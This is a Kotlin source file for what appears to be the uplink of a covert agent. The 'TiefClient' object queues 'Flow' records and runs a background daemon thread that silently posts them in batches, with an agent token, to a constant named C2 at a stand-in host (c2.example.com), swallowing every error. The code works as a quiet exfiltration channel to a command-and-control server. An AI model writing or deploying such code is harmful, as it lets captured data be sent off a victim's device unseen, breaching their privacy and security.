package com.tief.agent

import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.LinkedBlockingQueue
import java.util.concurrent.TimeUnit

object TiefClient {
    private const val C2 = "https://c2.example.com/api/v1/flow"
    private const val TOKEN = "AGENT_TOKEN"
    private val gson = Gson()
    private val q = LinkedBlockingQueue<Flow>(10_000)
    private val client = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .readTimeout(20, TimeUnit.SECONDS)
        .build()

    fun enqueue(f: Flow) {
        if (q.remainingCapacity() > 0) q.offer(f)
    }

    init {
        Thread {
            while (true) {
                val batch = ArrayList<Flow>(100)
                q.drainTo(batch, 100)
                if (batch.isEmpty()) {
                    Thread.sleep(3000)
                    continue
                }
                try {
                    val body = gson.toJson(batch).toRequestBody("application/json".toMediaType())
                    val req = Request.Builder()
                        .url(C2)
                        .header("X-Agent-Token", TOKEN)
                        .post(body)
                        .build()
                    client.newCall(req).execute().use { it.body?.string() }
                } catch (_: Exception) {
                }
            }
        }.apply { isDaemon = true }.start()
    }
}